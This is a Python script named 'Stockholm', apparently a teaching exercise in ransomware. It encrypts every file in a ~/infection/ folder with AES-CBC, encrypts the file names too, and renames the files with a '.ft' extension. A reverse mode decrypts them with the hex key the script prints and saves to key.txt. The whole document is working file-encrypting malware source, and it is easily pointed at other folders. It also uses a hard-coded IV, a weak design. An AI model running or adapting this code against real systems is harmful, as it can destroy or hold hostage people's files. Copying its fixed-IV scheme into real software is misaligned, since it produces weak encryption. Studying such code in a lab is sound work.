import os
from utils import Arguments, Extensions
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import hashlib

extensions = []

class Stockholm(Arguments, Extensions):
    def __init__(self):
        super().__init__()
        if self.version:
            self.display_version()
        if self.help:
            self.display_help()
            exit()
        self.iv = "Red-Taylor-Swift"
        self.path = os.path.expanduser("~/infection/")
        self.files = [file for file in os.listdir(self.path) if os.path.isfile(self.path + file)]
        self.files_ext = [self.path + f for f in self.files]
        print("Files found:")
        print(self.files_ext)
        if self.reverse is None:
            
            self.raw_key = get_random_bytes(8)

            # print(f'This is your raw key: {(self.raw_key)}')            
            # print(f'Len: {len(self.raw_key)}')
            self.key = self.raw_key.hex()
            print(f"This is your key: {(self.key)}")
            # print(f'Len: {len(self.key)}')
            # print(f'Decode: {bytes.fromhex(self.key)}')
            # print("Test:", hashlib.sha256(self.raw_key).digest()[:16])
            # print("Test2:", hashlib.sha256(bytes.fromhex(self.key)).digest()[:16])
            self.raw_key = hashlib.sha256(self.raw_key).digest()[:16]
            with open("key.txt", 'wb') as f:
                f.write(self.key.encode())
            
        else :
            # print(type(self.reverse[0]))
            self.key = self.reverse[0]
            print(f"This is your key: {(self.key)}")
            self.raw_key = hashlib.sha256(bytes.fromhex(self.key)).digest()[:16]
            # print("Test:", self.raw_key)
        print("Raw key:", self.raw_key)
        print(type(self.raw_key))
        self.cipher = AES.new(self.raw_key, AES.MODE_CBC, self.iv.encode('utf-8'))
        print()
    
    def start(self):
        if self.reverse is not None:
            self.decrypt()
        else:
            self.encrypt()
    
    
    def encrypt(self):
        for i in range(len(self.files)):
            f = self.files_ext[i]
            content = ""
            with open(f, 'rb') as r:
                content = r.read()
            # print("File:", f)
            # print("Content:", content.decode())

            content_file = self.cipher.encrypt(pad(content, AES.block_size))

            file_name = self.files[i]
            file_name_bytes_padded = pad(file_name.encode(), AES.block_size)
            print(unpad(file_name_bytes_padded, AES.block_size))
            file_name_bytes = self.cipher.encrypt(pad(file_name.encode(), AES.block_size))
            file_name_len = len(file_name_bytes).to_bytes(2, "big")

            content = file_name_len + file_name_bytes + content_file
            print()
            
            print("File:", f)
            print("Content:", content)
            print()
            
            print("File name info:")
            print(file_name_bytes, type(file_name_bytes), len(file_name_bytes), file_name_len)
            print()
            
            print("File name padded:", file_name_bytes_padded)
            with open(f, 'wb') as w:
                w.write(content)
            
            if file_name.endswith(".ft"):
                continue
            
            os.rename(f, self.path + file_name + ".ft")
        return
    
    def decrypt(self):
        for i in range(len(self.files)):
            f = self.files_ext[i]

            if f.endswith(".ft") != True:
                continue

            content = ""
            with open(f, 'rb') as r:
                content = r.read()
            print()

            print("File:", f)
            print("Content:", content)
            print()

            # Extract the file name length from the first 2 bytes
            file_name_len = int.from_bytes(content[:2], "big")
            print("File name len as bytes:", content[:2])

            # Decrypt the file name (but do not unpad immediately)
            file_name_padded = content[2 : 2 + file_name_len]
            print("File name info:")
            print(file_name_padded, type(file_name_padded), len(file_name_padded), file_name_len)
            file_name_decrypted = self.cipher.decrypt(file_name_padded)
            print("Decrypted file name:", file_name_decrypted)

            # Attempt to unpad the decrypted file name (fix padding)
            try:
                file_name = unpad(file_name_decrypted, AES.block_size).decode()
                print("File name after unpadding:", file_name)
            except ValueError:
                print("Padding error during file name decryption.")
                continue  # Skip the file if padding error occurs

            # Extract and decrypt the file content
            content_file = content[2 + file_name_len:]
            content_padded = self.cipher.decrypt(content_file)
            print(content_padded, type(content_padded), len(content_padded))

            # Unpad content
            try:
                content = unpad(content_padded, AES.block_size)
            except ValueError:
                print("Padding error during content decryption.")
                continue  # Skip the file if padding error occurs

            print(content)

            # Handle renaming the decrypted file
            current_file_name = self.files[i]

            if current_file_name != file_name:
                os.rename(f, self.path + file_name)
                current_file_name = self.path + file_name

            f = current_file_name
            print(f)
            with open(f, 'wb') as w:
                w.write(content)
        return


s = Stockholm()
s.start()

